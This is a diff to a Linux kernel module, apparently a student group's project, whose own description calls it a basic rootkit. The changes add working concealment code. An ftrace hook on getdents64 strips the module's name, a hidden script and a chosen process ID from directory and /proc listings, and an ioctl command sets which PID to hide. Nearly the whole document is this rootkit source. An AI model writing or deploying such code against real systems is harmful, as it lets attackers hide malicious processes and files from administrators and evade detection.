@@ -8,7 +8,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Groupe 4");
-MODULE_DESCRIPTION("Character device via misc");
+MODULE_DESCRIPTION("Developpement d'un rootkit de base pour Linux");
 MODULE_VERSION("1.0");
 
 /**
@@ -44,10 +44,13 @@ static struct ftrace_hook getdents_hook;
 static orig_read_t orig_read;
 static struct ftrace_hook read_hook;
 char rk_msg[RK_MSG_MAX];
+static pid_t pid_to_hide = 0;
 
 /**
- * The function `new_getdents64` intercepts and filters directory entries before returning them to the
- * caller.
+ * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall, 
+ * copies directory entries into kernel buffer, 
+ * removes entries matching a module/script name or a hidden PID under /proc, 
+ * then writes back filtered results to user space and returns the new entry count
  *
  * @param regs The `regs` parameter in the `new_getdents64` function is a pointer to a structure of
  * type `pt_regs`, which likely contains the processor registers and other relevant information for the
@@ -64,9 +67,23 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
     struct linux_dirent64 *cur = NULL;
     unsigned long bpos = 0;
 
+    char *path = NULL;
+    struct file *repertory = NULL;
+    char buffer[256];
+    char *endptr = NULL;
+
     ret = orig_getdents64(regs);
-    if (ret <= 0)
+    
+    if (ret <= 0) {
         return ret;
+    }
+    
+    repertory = fget((int)regs->di);
+    if (!repertory) {
+        return ret;
+    }
+    path = d_path(&repertory->f_path, buffer, sizeof(buffer));
+    fput(repertory);
 
     kbuf = kzalloc(ret, GFP_KERNEL);
     
@@ -82,16 +99,21 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
 
     while (bpos < ret) {
         cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
-        if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0)
-        {
-            unsigned short reclen = cur->d_reclen;
+        unsigned short reclen = cur->d_reclen;
+        if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
             memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
             ret -= reclen;
+            continue;
         }
-        else
-        {
-            bpos += cur->d_reclen;
+        if (path != NULL && strcmp(path, "/proc") == 0 && pid_to_hide != 0) {
+            unsigned long pid = simple_strtoul(cur->d_name, &endptr, 10);
+            if (*endptr == '\0' && pid == pid_to_hide) {
+                memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
+                ret -= reclen;
+                continue;
+            }
         }
+        bpos += cur->d_reclen;
     }
 
     if (copy_to_user(dirent, kbuf, ret)) {
@@ -411,16 +433,10 @@ void uninstall_read_hook(void)
 {
     if (read_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&read_hook.ops);
-    if (read_hook.ops.func != NULL) {
-        int ret = unregister_ftrace_function(&read_hook.ops);
-
-        if (ret) {
-            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         if (ret) {
             printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         }
     }
-
     if (read_hook.address != 0) {
         int ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
         if (ret) {
@@ -475,7 +491,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
         printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
-        /* TODO: retirer le PID de la liste des taches */
+        pid_to_hide = (pid_t)args.target;
         break;
 
     case RK_CMD_GETUID:
